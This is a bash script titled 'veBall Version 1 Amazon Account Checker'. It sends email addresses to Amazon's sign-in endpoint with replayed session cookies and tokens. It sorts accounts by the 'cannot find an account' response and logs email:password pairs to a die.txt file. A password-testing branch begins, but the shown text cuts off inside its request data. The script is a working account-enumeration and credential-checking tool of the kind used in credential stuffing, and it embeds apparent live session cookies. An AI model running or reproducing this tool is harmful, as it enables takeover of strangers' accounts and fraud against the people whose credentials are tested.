#!/bin/bash
BLACK='\033[30m'
RED='\033[31m'
GREEN='\033[32m'
YELLOW='\033[33m'
BLUE='\033[34m'
PINK='\033[35m'
CYAN='\033[36m'
WHI='"\033[37m'
NORMAL='"\033[0;39m'

#Function
login() {
    if [[ $1 == 5 ]]; then  
        SECONDS=0
  
        posted=`curl 'https://www.amazon.com/ap/signin' -H 'authority: www.amazon.com' -H 'cache-control: max-age=0' -H 'origin: https://www.amazon.com' -H 'upgrade-insecure-requests: 1' -H 'content-type: application/x-www-form-urlencoded' -H 'user-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36' -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'referer: https://www.amazon.com/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&switch_account=' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' -H 'cookie: skin=noskin; session-id=140-2900859-1636255; session-id-time=2082787201l; x-wl-uid=1dbipJ+eIc52CleKc8kqgD+98MM3FYhRiwpY2ppVJxfw1bgsaEG7mddWjpCKlZx/xO24xTHMyJfI=; ubid-main=134-9743934-2471246; session-token="660AqxuHRFPh9gTojv8EsJr7zmEEIcy0XQjbmqqAawBQMYgEV22bAusLbUqP0SJ4VRSXSIgas8jRYM7lyuFy8rkQf72+Gsz2PHWw0JwDc9TuH2fMpxwBAu1jvM+oQ8yejN2Ox7eY1w6zj1oXip4zilp3199iQjLaMjzKSlSuky1Y5AMXQpqCTjTtdme1pJLXfkc0hW2WyfmPC8eTyV8nXgsPK0AVjETBfXVtqfSc6LOoiDSZ+6sK9iwkL+dprAsMNXKtOb704Ec="; csm-hit=tb:G7J6FJ7YZFEB0X7JGMTE+s-4SEKCKXE013FJ2C4FP9W|1536894853137&adb:adblk_no' --data 'appActionToken=9Qs8nwTm4Q4ueK84C6KLaJyRFScj3D&appAction=SIGNIN_PWD_COLLECT&openid.pape.max_auth_age=ape%3AMA%3D%3D&openid.identity=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q%3D&pageId=ape%3AdXNmbGV4&ignoreAuthState=ape%3AMQ%3D%3D&openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNvbS8%2FcmVmXz1uYXZfc2lnbmlu&prevRID=ape%3ANFNFS0NLWEUwMTNGSjJDNEZQOVc%3D&openid.assoc_handle=ape%3AdXNmbGV4&openid.mode=ape%3AY2hlY2tpZF9zZXR1cA%3D%3D&openid.ns.pape=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvZXh0ZW5zaW9ucy9wYXBlLzEuMA%3D%3D&prepopulatedLoginId=&failedSignInCount=ape%3AMA%3D%3D&openid.claimed_id=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q%3D&openid.ns=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA%3D&email='$2'&password=&create=0&metadata1=ECdITeCs%3AldVpnxj9gsc8VkwHwYuRioH26wQwJvELIfNDAEB%2BPfz4ApdskTQSMxJ2rVnUiZpb2kZf2bL0HtynazSR%2FJgloKEKjjfwlCX8CPbVNk6GX7ZtsxDZZvPny%2Fcdvoqyv3k%2Fmbu1B619BLgFPZmBPd%2BUpZ1EBLxaptWKAj8ysKcUBl9UjPM%2BwYsn9chdjMIz%2FwRTXZYaBGql%2Fv7k%2Ff2GQBA%2F358jlBCG%2FF7Up27XY6FYyK1ZKLC1pbuYIDR8EjHayS39OHT19ITWnJsjoVgT%2FKfeWUJ1gFgF8ilFf52FAa%2BP2MlmIWKRYyFuxZ92xfd5qsmsXhT10POZqEp2rt%2F%2FtW80OmaHg2Z3SDrowKyz%2FFT44gkj5893iF9JNI045y9jfu2FD82UNPsNa6Fq0aHEBKX4scAxKCjw4UfIuguobVx%2B0hxNG9tNgMx9wwtTe%2Bjv1CL9UkDyCsCN9ejCQSHK9TIUQvw5Y%2FOz6WzCECmA%2BWD5IF%2F%2BVED94OjYNwitJyTjeUm%2FxR5lYqRW66OONCnvhiR2K%2BLce8omqElL9exfA3LvXcIW00rWyiurSuuHHd5w%2B9qRk8JWs59LiKL1lHhBGZkwK5%2BK1ojpAo3glQHppBUyMsvSIMnB5DmX%2FC6yjHMoVwmqRv0%2BflTjkWp9o4QN1lInXCdGhgaT5t7sJhBWvUzH4GsfoBgCCVglGHrPI8A6P8HbuXO6MlMnf%2FdIM0vUtp9z2iuTrpSVJh6CgILoRwImkcjrEdjLAzxBm%2B0osAN6GNdeoZWZcAv5JRxiM%2FQM27ElEOFMQSCSqcTmFZ7nVgmZDQOXhMIGk5%2FVSFd056cRYu44Z4bmYPEWui4QxiUMHzPR2G1LK%2FgXTox9wLTwzMcKlfZ1QKiHgyXIvNCMvt9xZYjJfid1wsQfYmFzA17cowOUKB1b%2BmnDAL2HLH3dax1UT3VzgkX6inatJ0f%2FThY1HRMeeFXjFh6WM3c4a9InAYwUjYBaaVd2okWoWAxq1j22tgx8PHVqaqUyvWNsl5gFQYbOBP2w579NmYrP5WBkDisx5Rj4Dan4ZvWpwfgYPohJxygEFptqFcV6BCHVlJeNkjKJ1DACP6s%2Fe%2Bl4s%2FebSf%2BCEG0MoD%2FD6cdcBrkwfZTiZaA7BnjcO06eDCYkdBe7p7d4fcrKknFVQXPExsI1s87FXch23T65f%2FECmjH1Ye5oNhlSXtulj3vVF6D6cNf3gCLxHQfkUqA%2B%2F0AVvGSgBEFkBuns1KpfkWCXTPegZLOeufLn8%2BD68BnyP1Gr1iS%2Bzx17tC3c86oGhd8gpsW90OopZJXiEG9ch3kecmzJtw3xosYWJ7kzXLDK6kN5QlJRV%2F6F8riVyxXszfmIhBIs44OCiO6i0dcI3l%2BYkQkphuokMlWlYoS%2BAR%2FU9H2sQinVzBCKZbjc0OUfb2kdKOPPHH52NOk584%2FzpIsAtmgHzVpbCVHyb3DOFVPUXBjWjc1wzWe98skPmEh0Abk40vJC4i6SSFAVvZJoHTl9or4oXJXeF3zJ7GJeEZU5QtYQ20oxwGZtl8emEHQ1dSUSfpqS84gcRdFr6peWJaTbBQgrX9%2FwiWV7n8DyEmT7vPCHX5ihZn2NmKXDvg%2Bn3lO%2Fhw3FXMQjENYAo1Jmhi5r8cE4eZMdCxQbnr0%2FmpwX89IyFMz7yhltRS4dRTR7PYP%2F58GViyBJg%2BUAdqu3nCk24S0%2BqCwWWvOf1RPyRF5ZeA5poyX90a6KobgZPIFmzbVEV1nb1mumeykD4JMquyru8j52meQ8ExND2AgameVOQ3wZDffF8%2BekvMJNAypZC1MyfNRIDUtRqOz9403%2FGZWHySTyXRN6l0JJ6oAxQXt%2FAmyH8TlfU%2BO3%2Bk3XxAEAOGs9Nnivpl%2BU4ankyXT%2B8QDlK4dG1P4cjHRbHvt8adZXgvslnL6eCkkTvUS9Vv0Pu5jajqk1lqDkaSioIym0IyrAvxiCxzorMzBZE8%2FImmtKzbthqBbNKpRhCILCFFs87UDAO%2BdNVDtewnx4nodrHlhZc%2BNAvsabDGFr%2FY%2F0iIxJg%2BLMbnjULeVsHHE4L16hSn4%2B4Y676QMFN6r5x8Q7G0UH9yL%2Bq6Ayiw6idFi1Oj7mk2U8rQ3tRnyS1n42%2FPfpdh7OtHd2%2Fr4epV6%2BdX4uvWv2%2BaeeEuOewKum2%2BeiaJ1Q3i3WYqltsflbENOgHG7fGlbhBja1Z08UGzRRk5FbS5RkHYtQTuqDKB5n5lNumxsIOwmcAgQrZHnPt5nnrZI9XrWKQah8v2na3nxXnQYpEXS3jJdVCJRn7LHILBhDtJ6CZPwbz2INQT%2F1BHc9qHs3MKEsh6kc%2FaojpY%2FP8BOJ7CaYlOr19Yvkpl38WFihnxAN%2BrjalD70%2BvW%2FAe5a84ZolYYEICGuvCzpbu8iiNfrC88v2ej13ZQn5fnY6yTBTsjtx27%2F3iRdO%2F9Azr4ceLJktC18%2FL%2FrmAmo7xHhc5MMeNSYJW0Ljquo1%2BF5PO69aXy7vmL6INLT3jR9zISkIEah28xUTRfjjQw4AXgUigCt7FXwdQLMG%2FxG%2BT7o5rYTN5Cbeyb9kbfGFO7kznCLAe%2BMLohnajXc2NfCeUcHNQRcu40lB6GD3%2B1DtAvIPh7V5PUoScGz8fZ7o1b1A6YF5BmqIgg2E40l%2FAkvrSlZOBRSthXIunu2bAs6tJMueQukNHKU9HZjcWt3cAKZFUaII9F53t1DRrkLUp5QlvpO3aTPm6t%2BRnJbcm%2FdX186%2BGy4RKBqXvzSxg5nFhorUW%2FAPTtrsfLUGcDDC8oRESHqCGSo3qPedQ7cI3wtHkhEDxJDj4zuHZYGTUOa0uFaWPxkeXYKenBI5awpAoiXYonN%2BE94zmz4pAGdQRigPHkYDJSTNbXWn7So5cU4dq7159%2Fiq2no0SDxC3WQz0F4p77tgWUqbne28AQkzchF6bKUrqvhPefKSuarOq0aeRam8OSVtZjvN%2B2XMFP5rp9agqc%2BF1k%2F3ZTvs03XZO%2F%2BHD3zkq2y9wWDmUkYd3v26cEnWie30jTlIft%2FsWODMhPli8kfONpZzqODk8wpO%2FXuNf4%2FiXrBvbp9vAnpUd3wLy7bS8deyUr37ECGbgkJCN3k4YilpZ1HiMqr8Yeo7gADp9aRU9G5qhwzHmRXIKmRY1aobTBmJVNh3HQxFZf7j6U1hbrCRIDFf16Fu5OmFvNI1SbLtWUymGybmZUPL6kH83aUbtufJR4tzCO2FyZ8MKX42CYIW7dcVLmztsPkWGt20k007CLSwlZOjjGcTgH4AzYCCwby2alr9LI98mFlYroSggkyeBHT%2BmlvornFMTn00HEU61m8VdWkjFZ%2BRtyNR0bePJZGTyDdR133hxT4eicF3KwnQ2eo7lFX5kWOxJq9AbddhsvulHz8kG0sY3wGUsE9fungyWI93pns8o2faPf8ojZQOIcyQJymg%2B5njU35kyj7MXb5lgBw6rhBB2xRT3Y7cKEVjjEPiM5JaNIuYtgqE8Z42o0LfFbKwogq7TdNNDOENeAlkS7Fp%2FfFxt9cLiwWgkzrFElgwneyoCvWJng4otHuCKa9GdbZn3nmPULInan%2BPgB9oJcVhYI%2F5B4nvLL33Xed2UXkC2d5aHST0RVKUVEaQFXxvBqq2azg0hcQOk6z2m6Bti%2FOfmvJMcUMB6AoD8XoK48GHaT%2Ftb3JeUSk%2FeI4ZZY26aBTjTNd5XRgGa4W5vXqFNWp6GuvKGu6dKa%2FCnmxhfA1r6skiHkljeC1oIINQqBHcIt0ce7GGAqLY9MRC7ZAwf13iHlJCSopa5UXAQD92Wx%2FhOLoq%2FsQ09Cc4gkhmS36ooUL1Az5aE9nDYIgJHvd%2BgFRwyDja5YE3stLeQso1Ou%2F9Mh61ne27vzqq96O%2FSLFNnHLsmMeCeQ8D5x48TDQcc2VHFKd93neIYHiFK8ui57Jxv0YvAb52h6b4XpJ9V%2B%2BQt3WTZXibFGFlNFbTqxm1hNnS2Rwwjt93xDTh7Sq9nFLZeDY7KLqrS3wdEFgtcN1yJOSxAc0qvb5w0CwrlEbSIhZqsU%2F2jQdI4dL2QxmBd7hOVB8jjfM%2FgcYTslzdd7gV%2FPLuf1IIMRZDZ%2Bo4o0YO1IBwK7J3CZ3dzM1ojjFhT1Koab4SYwa42Cc%2BlH6lLyWfYdskzgdwnr5tlfMnxQf9Aq%2BZLmKmLbMSKFv0Fh14oWEC%2BKSll9bMpOlSuPoF17Na5PzkYK0BqHhlBThV98%2FKWL379J4OJlp0l0TZEm%2FdjT4jzMYxBFT4hRuXlyncC6xaIvWUCXInIdX0X8WncsCvto6qj7NOVCHkKnWfOVasm7P4sCPU1tPlAtKJIcRUw4zCkN%2FcI7aqAIagkxeatE%2FbyVyU6aOeJ8PDgvc9foIe7ilrm5T9NUGWaTbu%2FX6IzgMb5FGAidhjWDpOHUzXOUIyOpa7%2Bbhjh5IyqoQtQqdvOZr6hyK5sk7FoxmovmVsxmTu7SulM7T%2BEIXoJa6qorUziEw1mRCE9wTtavB%2F3ZIx%2FNTDTRc7%2FAtrnh4x4DAEHfO9Uw7wAmis1h3zUq50Jis5LmJ8m2YqwXTTXCZ7xuglm%2Fk8dAOluA%2BQxD2O04IDZs%2FKFQNHhrV8qUv0BdzA%2F6kqo9Sty3KDMmRmDDR3oYgGecIF6eZOSnbHbBz2uHwep9CfA2btcxrwDsFHeVUhte0mcl0U8RlSieLEg727OjnabzrK8232FyNRIzVGAHp5JndqbeBD51blHB8jDIZtyAobwPYaNitbQ23%2ByOD4omwUmzIQIZHHvJ3RwVPU6eR%2FHrK99lKXHRGs21WhNMczYX6LoTwOXTDQ3q%2BsNDhbbLfXelJ1vbmGN5QiJoxIGeRDZLlgDDy%2BNGhn17FEVuwfEyf4j7%2B2waz9%2BRggZIkMubw9Iui2YFZPSnQ14hMx%2B6A%2Bb7WK6p82anhSRVZqDrVgq2VWd%2Bwt5XNQXPGD1EvKchqlBzamOlX4yRAzypXAqChZAYoiSiqc2R23Oe6ctzfb7BHe%2FUxNra4tZwLz9J8CFnZuzzXpXRoFSp%2FVD8uWk2nIE1Q3ByvBbQVfeIzSKNeh6iwAGgB6uUxVAYY2dedHbwifq5yI%2BSSUts6tlJ1Q9P2kR3cq1AQ12EW5AuUshx52NhNpronEPOnc%2BL%2FLKrlOO%2BMiWfKo0qooLZmS%2BXikXuJ%2BYGJzbeDfQ6dVWjw6EmhAy3efCvLO4TXQmFOOh7f46862h9hmKcUJIhbsAcrchpPRWp533Zq1N0nZudU4i%2BbR9TiqiR4Wte3LEZLuhzXL1370Mb3FOkQWGrOi6Kw1FJ7h8YC6dxNI%2BTsX3dyw8caX8xwtfw9BSRHYaOl3Xl8nZF8ziAedJWx3voQIa2Bkzqqy9JOI3Poq%2BhnmeS2cmI0ffmLg%2B%2FZTEY8VnPXzcwqfL%2Fs2Yn1zx3vxKSYPlSjyGcAR9lJE8vbEcsCv0%2B6M3aixgKj3OBDFWz6pnaVrROa%2BFLs7VecZVa4pKO0OgBtAxHzkmVagEVAxBZKctHvm47b7267F7jJargShGAtLVWDePYM6lOaKMGXNhlBMKjGT5gBjry3%2B7Y9%2FVTB4%2Bik8dkVG7yVgzSaEwHWobHgsamilVBV%2BVDlQfFB7NDkOUyCidSKTa6aGiJm%2BJSJ5vZ06v4eXz5MnLuoY6MWPbOYBx9mQ%2FZWXpT6sjUEw38dZs5egL8a0%2BliMxcPLbvveOaIitsjwP%2FoR76zeu2UN%2FeuX5ncO5vQJluX7In4nTLUjszooIeN31wjtXyz3z4fXxHoYrgcHOPyxIh2O2%2B4oCMUvnEGld6d%2BG3rofzkrexPIqt5nBXx6C7wYf1ujXhWHdAsHqnXW3omeSguB9Wk82O%2F8EpgC0yXg719uSZgAjgxc2NyRJVGuQNq0OIhol3PsKTkWrCTtGXu7IJeK5zBDA9jJ2DrOHlLlkXA8vRkK9SY6r9BzLBVzWPy5uHEAbQiEVLrRwEZjso9%2BPi8azRTJ1kVYY%2FHE56Amd%2FcWAK5bt6y3bAA1wbKEqECLFGWWqIf6CgBThI9MdFtzoDzvfalc%2FV4KNiIxJtiFuJFixKunBGizw4CrAubzyfdctD268KdMO3lF6OuTfFUpZFIvieAqO4MbuTPTOVhIH0osBnEPmgbxd%2B0R0kFmsQJHbnUGy5kc0OgcudHOUgQ8Xl%2B83UgUQlQzpQr6L%2BDc5Bejlk0GF5O%2BkfSypLVjeQG2fTfGh15V86pETHiKx1u60b0J1BBK4cqRgQkRXM1nJU2uXRmrUG64gHjZL3ukZzC%2Fn5%2FbZFftD9wjorTCv2JiKl3r32nFFdjLdvm7FcmMi3hIYQJhc8P%2FnsCYojnrYBEYcp%2Fq0SXSgAOtoY9shNMEqTSL53ZUgGvJgTZ39HIb3op0IRQIi8PD3RpH2p1eiatZPvVUbCCx7gcI0FpJQvIpZuTv6VFZcDn6COXi9hkuMr2zHHSXVXkVPQ9aM%2BeVE%2F%2Bb51ADL4ASp3kJDpNXtNGO8uGA2f9tu%2BWPwz44%2BVxctwrHOPZMDKySxDsd4u%2F6hSobbpfbbTut1kUSwMVvysRuOjCLZLCsVEd4tlR9AVMP%2FGMqeWxyXIXPcgjppLV2POpoG5bZQvWUKSkWRT55mCG7k69rDYwk5Leva5I7xNKV4mHHWJOSBn4E8Cej2Fk63weXs%2FHnFkAOOyI3h9MAtsOSZwSxDJZrk1ferEUnF60TP%2FMz95pRzWjE8vch9kpkWoC%2BhIGcwOzrLzUkUHOGyvontfLhof0uGehAMA0bzCLBk3yL%2Fw5tGm7PARbGDkhYE3voxmjkGm%2FiFmc0YXvwsNWDfICshAkqC4d%2FIGzvxO5X%2BtRXPOlhlRIuOthoe1umALlbYSDENfJ%2Fp3L7hlULRb5xgrfgkBMnn%2BGOYL%2BadH5gRsGyLJXRmgEuebazy7TIvuZ%2FuX0XcegqjO3l6%2FXBnkDdJDQS5gS8Gk3Nlsme7rqNLMnXbueUeIMh2FUP7RmsBBC4B9xThBCDc7XPAPRKHh%2BfRMxAXtiT6PWuWntNdLhpt3hY8fEHEcK63GbR%2BDck2yiPnr8QHcCI%2FjSPPtkVuby%2Fu4mcaGCa8%2FkX5%2BP5O7kGuH5R0ryQWkb7I5KdXaZvtCOqH0G73rjAuHp8ycblVupBi6TXK8TWVBW5aj0h3rHPzhV3JeXWLp0weab8%2BzSeTgUcTqlF4iPrbd%2BGPQiSn9Kn9vUUm2gHhSKEMIK2%2BF3bUnIrwftVQFpSmY943Fc9n1rZDPIw83izInhYD9tDiyxpYJd6lu0fSLAmy0EXvjq2n4wLPwjkyWSP%2BH4%2BUcmOAwHIqakUAdhE4Aev2N8RZgjPN49K2XQUKnFtYLQ9jkptDlgTY8q4pbnY9UfuZpd9T8fCSKjlUI9uje2xz%2F33fDgXLAjrgoAn4DDaWozculKQEQiHGHxD5N3spWvJJQavbL%2BM9pnE7lYZfAjgCS%2FwEelieAo2Q0kUdnQByL%2FxSi5P%2B8SzA2UrUu9u%2FMoVVCcycj7RVhIw%2BFXHu1ZeGWXDeSkkvd1AVGdDhV9ZdU5McFL3WDrXgbkrx6Lk4TbI6Y5k4k85epZiGOy1ECfZpWEnSj5DZthaStY8IKglYVJH2BEL%2BDEaiAnkCTpTzXyI3cS96pVlZvTmWNm3BpH39HQ5GrElBFPP1jpuBboto5twHxd1wFx5CJNt4g0rTNYaAqSg9uhMEPc777p72u8i7rsifLaFyJ%2BTFy7x%2F3yzunRfVKULuBrtY1d45VihXBWk18j1YmdfXb8qqx08nX0Gq7eXLDOUBGTnaNBXftW1AwroD%2B78iaCiFsFpa6ppbB1vPKwdj0zW4BHWpjxYJJkBx9BMTHLaTAHLCBrxQ8X8ddos8a8JrnzZBSiki51AN4Z80c9HNZbXCIADB%2BR6tY%2Ft0Wa%2FsSQFmkngXWvUBKHn4RWdk%2FccEw2S87FLyOcrbv2stZI2NN71C5TxQpqW15hN5GjZCpBrBBfZgX01GVIGn0aM6RdiAJr6K38vDTB1QlR20rEvLD4LJGROZ2hzYP7V3gvWtbo7yxy7im0KrjtjVjS0M2hZKaE2ai1bwhtWIP3RMWkPA85D%2BFqQLi8ZnXJQxEwOloKjzn5ioUDNpaBBdT6jAxNbdbmL0bCHzMnxKr%2BcmE1jOhqJ2Nbq4Gk21qHtH4PbvLC3f5TLEA1p8lsah86ojHGmQ2GTAciM9f5ig8naoXaDuHWhFMZN0N%2F7l6p0KyPYfFF9jc0Vcunfll5CwcTDNkZ%2F1TK8wbQmdv%2FYZrQq3IeUmsMBO2il2E3GSrUji6mTp4x481Vg1rHZy1Ig8K%2FzkHov3gpO4guNvdho4quhiOkBzr2GoBeIRQEJZSDRrBBbmi6PKcwLy%2F4ewhg2yVEukNleMAEw1OgIqbqGVjs%2FaHXfecJGYmbByYsziOloTUxyvIxu8ldbMIdCVGx7B0Uim4wIKobozwld%2BeFqKeH%2BG91jTbVP%2BkL4yl4zXnofwXIswcq1Zh%2FCmNxhp4G71EfwzRrRPh%2BvsvakB1jIL2OT%2FTZbpGMKe92URXKddjWnRDwi5QG4bGhMMIo7RKugJxyLCSnt%2Fha6dxgwiDyyr%2BkEGHPMUcCHDZoocSl9yJRXoaUPdcw5VxtzydCh0fWP%2BRiMeKHa0HgFfJ1LOZB60w7RQ7fzv3%2FE2R5UevRQGuRuFmHPKJi4rON9R2WuyCVhP1qERyYw98dZZ%2BeY0i3MZPYl%2B3nQFbQsdyq7O7X1vHCNsfCyGQQ6a%2FQIIJZ%2FgjgH1bWg0IHJqNWgpZsRvS5Glv%2BJNfGtAzZXeWNEuX8fIUt%2B3iUhUD%2B6SYkvu8akmuUIKWHEr0NLH%2B3b%2BxK5Xg19nWzMLshnq5yNOuZ%2BpniHPEF148aMg0MY4IPuexcI50XGaDtkTkrFI%2BNEcdoaLqcountEv%2B1LqKbwSUNNDxU7F%2BfqNJLEwWwMY1Le8AUD9ZpBkjenG7mKDxCvnOqGip%2F8xKo7dDC37k8%2FCLJ3RVUbX90UxYqVdJz0%2BvVAD7A3hO%2BIsm%2BpnsYSU1ggb1nmJx6QxXvELKXB%2Bmem0LfO6CUnKVhQ2KBGTIzgowvmfkV3d1nZzLqBSrOyiVyDPYll5ghkk5i9sbsTbsSsNJj25ALLi%2FGNo60VD4Qjh5sBjGfRnI5RpetgctM1iwFGNGMC6ysKpiOA6CaXge%2F7%2FgNxT4Lk76niWcLBhXgfX68bXq7pxEfR41G6aPH%2Fn1ihDKTdRlV4NIWTyLl3hm5LwJGLOAraUzmeD5tq%2FPESFRmbr1t1cm4nW6KbwWX3TPk07dqENiVGWxrUiK36IWUOo0gcOLyEpGxZBG%2FkB0huYfkixrv2OyPSJI572R3d773%2F0g2rEXj9La9Ee7DOTvdMnfv1Fc6D5bQsmqS9H83WO4IQD84H77GYcCbvOdhJ9Vr5R8gkQIPTLbWRdEVgO%2FV6V%2BBUhCp9TZyIxes4Tl%2BMc4zWNC6XBRg62SCP5yc3NaiFaqzOtTb7O%2B8H9l%2BsZCjf0gL4YpGnbKo8If0bszWBMkLubff9JMxVmkrNJHUta%2FlZcd%2F413jqWzXSTRITDhCI12FVYKm8NfQ4jMTdXHD3mfh1zt5eKUO2ThBlJF4C%2FStomHL3K88vV4pw34orWHoTx4MlKCL%2BudJpcZR57%2FjKcX%2FoPwrRBJafei7NvGWaw%3D%3D' --compressed -s -L`
        duration=$SECONDS

        grab=$(echo "$posted" | grep -ic "We cannot find an account with that")
        header="veBall Version 1"
        footer="[Amazon Account Checker]\n"
        
        if [[ $grab > 0 ]]; then
            printf "${YELLOW}[$header] ${PINK} $7 Line left => ${RED}DIE [!] $2 ${CYAN} $footer"
            echo "$2":"$3" >> $5/die.txt
        else
            posted=`curl -L 'https://www.amazon.com/ap/signin' -H 'authority: www.amazon.com' -H 'cache-control: max-age=0' -H 'origin: https://www.amazon.com' -H 'upgrade-insecure-requests: 1' -H 'content-type: application/x-www-form-urlencoded' -H 'user-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36' -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'referer: https://www.amazon.com/ap/signin' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' -H 'cookie: skin=noskin; session-id=140-2900859-1636255; session-id-time=2082787201l; ubid-main=134-9743934-2471246; sst-main=Sst1|PQHuXa_xkTOUyUHuptjtuNqYCx2Y3_J0nKhGgocnJKXQnMB4tFcoOh5kU02qeMjuwiR1-j9KbZSHCimrlamHh4vjEiDoDN3idfi0REA2RDMB_Wxtym8zbjXFui-Zo_zptuCp23NdgxYdZB8acUd3JbFlDolNPLFt-O9K5_Zl8QdG2pHGMk7a1ahqMz3BEnICBJLHR_yr3_v-z-7LEbZU99MSO_HXJIlcf0FCdNSKGkedoi8aQN0hE9QKqM1qUl3cceCcBn5JXr3E1Ru-9rXUfQurnspA4jW95LL3Kz0BvMO8K0aOvtw9coUSIseT7Yrn-SRBSyNfA1RKq7sZCfTkJ88Ilg; x-wl-uid=13tN/PgRHAWXRHU8Z3VJumpyqtHdaycrQfQRLvbkG12S51mKuPCf7ZrMMy5/x4RZp9VsQbbGC8Auu+91Eyr+OBfmjsnCi56XU/P2eVq3m9LgVlVS+Ezsl2ylAmQh39yDdXkj15xSHZNg=; session-token=fapqYt0iU6xs4VHAOOjWxegTjAeyhmDszpe5QEl7pcYXsL0XVerbZOGCs6jAs6I1no/HQrH0dpuFUOErOUWzYSKGvTvlp9HhfTx7tpWq2JbAGUFtwvBO0xiF4z7uUxdExTrpqByzbjG9MJfLhpfx4A3A4jbJV0/ZiJtPJu99RR+owzGyHI1mAVPvVuAz2lsJDFZDE4nhYGQvL33wjpuDpevHO22/qD0Ic6qkOujanh0cECWHDy8UifyXOPFOLwXjmLPUa4ORfiI=; csm-hit=tb:G7J6FJ7YZFEB0X7JGMTE+s-F4HP1ANMMM0E1HPPB1CN|1536895622819&adb:adblk_no' --data 'appActionToken=9Qs8nwTm4Q4ueK84C6KLaJyRFScj3D&appAction=SIGNIN_PWD_COLLECT&openid.pape.max_auth_age=ape%3AMA%3D%3D&metadata1=ECdITeCs%3A10Ss1bUPBb1DkKHvfWd%2B8zfM4%2BkAqUv5oaFhGWHcquO3D%2Fd9SoOk%2BK8X4n2Pz8hrvqVBK46Zoy2ievjZtDvRxAi89TnG5Jqj3RSrbrI%2FvaIbwGD%2BNR%2BItSs9QZMszhM%2BZm6%2BMfo6cGAq%2BObL3m%2BEQRtbXU%2BWs%2BZwWb8qTl9B19kuTckJvwlSycHZGVmviFvB73qWukEjtqEpMJK4b03hUXrFP%2B7p9ygRsFrGYC%2FGhLey3rKb9TZH7bLl4U%2BPaYPgat8bnTTKfkVZjvRLx8BEHcMNX%2BzVy8%2Bywo0LiqR%2BlUk9PK2ZryQIXObjlavn14s1UA0SH6sul7Lz9%2FNbjZMqlNuFCvDeSXuJqjF544tB3Nmj1ZyhihMIen7kysd0tymmgUOZkr6OBRGliNgvPhzHn0Mk1GkHkO1tV2h7khASXkMX5WwjmkZv7WxI485V6GcqdOKa5mZumOzXne%2Fm2PWUCXLtqbydJTWFgwPTnOZ2oPpmbXfg%2Byy2ep2RXWb1JIc2JmCs4gmooJhbPYwAtQUSqmUqpefD0WJAVFQUX29l0nS4zGZoUBbx0h5QHqtTR0n05j1fJD1fHUdV89JwR%2FYwWxIQgqEHiM2VHp4xTblQflraAT757DW41kaJxPhfrcLDj7zNPYITzmTiHP6EH9mdrYRamhHPb0fxnUQTMNRvnxHShrQljFz23sIzul8kMD5JMytEjZH6Jk9jp4ahO39Clye5yAwYxh0cassVGuiu5fm0dBPp8l9e3v8iErQv5oiaF8WfsGy0GPauMwwGGSCMSzMngSU44OCtlUna8kqMiv0fwUBfOH8mo1SXVbrFamUstCSmaRJpwWWzYnNG%2F3v9HC20tzdlWvAVYt%2BTo0QzSZK7rgzDNpw9QsXC0vVOHw5TvlRNC8Clfmf3cFdjaMySDz6an3mf67dpC1V4fkUo79MeWAUoKtb1b21auXtg2%2F6AdRdwzNiiL1z0v8cmTnS%2BjjDy0DHqYdpUBy1QXce%2Feo2KHiiirZ2giDFg7mflRZxDgPiBz%2FyrvHm3ZAeEP%2F2aEOTc0yFggzAKNQl5nVPNidaBNc0kVgsJnysuKXFDWBXqoeNCMnPsLX7KFj%2FiizM8UYf%2BRYHtnvwQ1liGz1BdGpno7JaAQ8jbXGxijREfIRTmGNobSmkOXMfemAebSJ5XGBd4hVzLyKCdvBbnRzV3TyFaIgSzCYsjF%2BZNohJkcKitD1eLwVLlkPCvZjezsCYvSoTgdx7I7B6J50MbhT5bQSRD1II0dpoPZmJeLGEWSiS7bDSmcBg3WudQoCKheuAJ7wToD9zGBQGx0vDBdxpL3LyBJGyw4J54itkR%2B5zFbqQg%2BhaGNT9g8Sh4zGxMTbEg3ggQyDby1ESfuUFdYTHp28jISF%2FjeFy%2FiEZRuyv1SivXRxarUrVUmC9Qh6IoJoYl5pvzt%2BNYFa%2FEwVU1LuJGE7GBb09VgoBVckkAVqxRDgaJUvFG%2B2AwLJC5cmx7vzdPBV2T1Iyb1875dHkWymwebPLucRVH8MoPVrQXJA1IHnoaJUOdUx9xIoHTPsp8zSitqxmlhBK%2BybJXTpZiR%2FZF3qIUROZ%2But7gp82DKBZCR4YQ%2FK%2BxXAo4opwgSkAFQPPnREezf1sQolalO9L%2F07PgsFd1HO0M3pTrmW4rehXHjE6agSoYi9A1CEY6Ly0obt0H4v%2FuisusyBL0b1oFzUSQ8pJEDxWhNLLouVx5sTYsof2b7HJ7HDM5xjtLCcjDMP%2FtBZ94G3hdorJQygZM6q7QocX6ji%2BQry60vzgmn8iYpb8cM%2FWvtv0w8uq1jFHTKexi%2BdEwE5139o%2FRXqrecAQCLhO%2BviSXk%2BFjUbWse%2Br%2Bx26pqXMgG2NcFUugYxf0nQ6Ji7VPJ32jhK1Rxr0GjnxIDxz